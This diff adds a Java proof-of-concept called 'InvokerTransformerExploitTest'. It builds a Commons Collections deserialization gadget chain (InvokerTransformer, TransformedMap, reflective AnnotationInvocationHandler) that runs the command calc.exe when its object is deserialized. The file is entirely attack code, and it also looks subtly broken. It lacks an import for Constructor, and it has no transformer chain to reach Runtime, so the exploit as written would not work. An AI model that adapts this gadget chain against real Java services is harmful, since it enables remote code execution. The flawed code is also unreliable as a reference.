@@ -1,0 +1,58 @@
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.util.HashMap;
+import java.util.Map;
+
+// Ensure that you have necessary dependencies for commons-collections and JUnit.
+public class InvokerTransformerExploitTest {
+
+    public static void main(String[] args) throws Exception {
+        testInvokerTransformerExploit();
+    }
+
+    public static void testInvokerTransformerExploit() throws Exception {
+        // Step 1: Create an InvokerTransformer to execute an arbitrary command
+        Transformer transformer = new InvokerTransformer(
+                "exec", new Class[]{String.class}, new Object[]{"calc.exe"});
+
+        // Step 2: Set up a map with the transformer
+        Map innerMap = new HashMap();
+        innerMap.put("value", "value");
+        Map transformedMap = TransformedMap.decorate(innerMap, null, transformer);
+
+        // Step 3: Setup exploit chain with AnnotationInvocationHandler to trigger entrySet and get
+        Object exploitPayload = createExploitPayload(transformedMap);
+
+        // Simulate serialization and deserialization
+        byte[] serializedPayload = serialize(exploitPayload);
+        deserialize(serializedPayload);
+    }
+
+    private static Object createExploitPayload(Map transformedMap) throws Exception {
+        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        return constructor.newInstance(Target.class, transformedMap);
+    }
+
+    private static byte[] serialize(Object obj) throws IOException {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(baos);
+        oos.writeObject(obj);
+        oos.close();
+        return baos.toByteArray();
+    }
+
+    private static Object deserialize(byte[] serializedBytes) throws IOException, ClassNotFoundException {
+        ByteArrayInputStream bais = new ByteArrayInputStream(serializedBytes);
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        return ois.readObject();
+    }
+    
+    // Dummy annotation to serve as a target
+    @interface Target { }
+}
